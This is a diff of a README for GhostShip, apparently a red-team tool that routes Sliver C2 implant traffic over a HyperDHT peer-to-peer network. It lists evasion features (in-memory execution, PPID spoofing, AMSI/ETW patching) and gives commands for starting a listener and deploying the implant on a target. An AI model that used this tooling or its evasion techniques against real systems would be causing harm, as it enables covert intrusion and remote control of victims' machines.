@@ -1,114 +1,80 @@
 # GhostShip
 
-## P2P Command & Control System
+## P2P Command & Control Bridge
 ### [v1.0.0](RELEASE_NOTES.md) 🚢👻
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Purpose: Research](https://img.shields.io/badge/Purpose-Academic%20Research-blue.svg)](#)
 [![Status: Alpha](https://img.shields.io/badge/Status-Alpha-red.svg)](#)
 
 ---
 
 ## Overview
 
-**GhostShip** is a peer-to-peer (P2P) command and control delivery system built on top of [HyperDHT](https://github.com/holepunchto/hyperdht) and the [Sliver C2 framework](https://github.com/BishopFox/sliver). It utilizes [Holesail](https://github.com/holesail/holesail) technology to create a stealthy, resilient communication bridge that requires no public infrastructure, no domain names, and exposes **zero network indicators** on the target side.
+**GhostShip** is a peer-to-peer (P2P) communication layer designed to bridge [Sliver C2](https://github.com/BishopFox/sliver) implants and servers through the [HyperDHT](https://github.com/holepunchto/hyperdht) network. 
 
-- ✅ **No Public IPs or Domains**: Communicates via DHT keys.
-- ✅ **Automatic NAT Traversal**: High-performance P2P holepunching.
-- ✅ **Zero Network Indicators**: Uses kernel-level pipes (Anonymous/Named) for IPC, leaving `netstat` and `ss` completely blank on the target.
-- ✅ **Cross-Platform Stealth**: Purpose-built resident loaders for both Linux and Windows.
+By utilizing [Holesail](https://github.com/holesail/holesail) technology, GhostShip allows C2 traffic to traverse the internet via a decentralized DHT, effectively bypassing the need for public IPs, static domains, or traditional VPS infrastructure. 
 
----
-
-## ⚠️ DISCLAIMER
-
-**This project is intended EXCLUSIVELY for:**
-- Academic security research
-- Authorized penetration testing engagements
-- Capture The Flag (CTF) competitions
-- Defensive security research and detection development
-
-**Unauthorized access to computer systems is illegal. Always obtain explicit written authorization before deploying any C2 infrastructure.**
+> [!NOTE]
+> While GhostShip obfuscates the destination of C2 traffic through P2P routing, it **does not** hide the presence of network activity (UDP/DHT traffic) on the target host.
 
 ---
 
 ## Key Features
 
-- **Universal Architecture**: A single project tree for **Linux** and **Windows**.
-- **Windows Hardening**: Integration of **PPID Spoofing** and in-memory **AMSI/ETW Patching**.
-- **Memory-Only Residency**: Components execute directly from RAM where supported (e.g., `memfd` on Linux).
-- **Serverless Transport**: Dynamic P2P routing via HyperDHT.
-
----
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                       OPERATOR SIDE                         │
-├─────────────────────────────────────────────────────────────┤
-│                                                             │
-│  Sliver Console  ───>  Sliver Server (127.0.0.1:8888)       │
-│                               │                             │
-│                               v                             │
-│                        Holesail Bridge                      │
-│                 (generates connection string)               │
-│                               │                             │
-└───────────────────────────────┼─────────────────────────────┘
-                                │
-                       P2P Network (HyperDHT)
-                                │
-┌───────────────────────────────┼─────────────────────────────┐
-│                               v         IMPLANT SIDE        │
-├─────────────────────────────────────────────────────────────┤
-│                      GhostShip Loader                       │
-│             (Embedded HyperDHT + Memory Bridge)             │
-│                               │                             │
-│                               v                             │
-│                   Memory Bridge (Pipes/FD)                  │
-│                               │                             │
-│                               v                             │
-│                        Sliver Implant                       │
-│                                                             │
-└─────────────────────────────────────────────────────────────┘
-```
+- **P2P Transport**: Routes mTLS Sliver traffic over HyperDHT. No direct connection between the target and the operator's IP.
+- **Universal Loader**: A Go-based manager for both **Linux** and **Windows** implants.
+- **Stealth Residency**:
+  - **Linux**: Uses `memfd_create` to execute the node runtime and payload directly from memory.
+  - **Windows**: Implements **PPID Spoofing** and basic **AMSI/ETW Patching** to hinder local detection.
+- **In-Memory Logic**: Communication between the P2P bridge and the Sliver payload happens via internal pipes (`socketpair` on Linux, `NamedPipes` on Windows), avoiding local port binds.
 
 ---
 
 ## Quick Start
 
-### Prerequisites
-- **Go 1.21+**
-- **Node.js 18+**
-- **Sliver C2**
-
-### Usage
-
-#### Step 1: Start Sliver Server
-Launch the Sliver console and start an mTLS listener:
+### 1. Prepare Sliver (Operator)
+Start your Sliver server and enable an mTLS listener:
 ```bash
-# Inside Sliver Shell
 sliver > mtls --lport 8888
 ```
 
-#### Step 2: Start GhostShip Bridge (Operator Side)
-Establish the P2P bridge to your Sliver listener:
+### 2. Start the Operator Bridge
+The bridge connects your local Sliver listener to the DHT. You can use the pre-compiled Go bridge or the Node.js script.
+
+**Using Go Bridge:**
 ```bash
-cd bridge/nodejs
-node bridge.js --port 8888
+./bridge-linux --port 8888
+# Output: Connection Key: hs://<public_key>
 ```
 
-#### Step 3: Deploy GhostShip (Target Side)
+### 3. Deploy the Implant (Target)
+Run the GhostShip loader on the target, providing the connection key generated by your bridge.
+
+**Linux:**
 ```bash
-# Deploy to target
-./ghostship-linux --connect "hs://<key_from_bridge_output>"
+chmod +x ghostship-linux
+./ghostship-linux --connect "hs://<public_key>"
+```
+
+**Windows:**
+```powershell
+.\ghostship-windows.exe --connect "hs://<public_key>"
 ```
 
 ---
 
-## License
-MIT License - See [LICENSE](LICENSE) file for details.
+## Project Structure
+
+- `implant/`: The Go loader and asset management logic.
+- `bridge/go/`: Operator-side bridge implemented in Go.
+- `bridge/nodejs/`: Reference implementation of the bridge in Node.js.
 
 ---
 
-*For academic research and authorized security testing only*
+## Disclaimer
+
+This project is for **authorized security research and penetration testing only**. Unauthorized access to computer systems is illegal.
+
+---
+
+*GhostShip - Sailing through the DHT.*
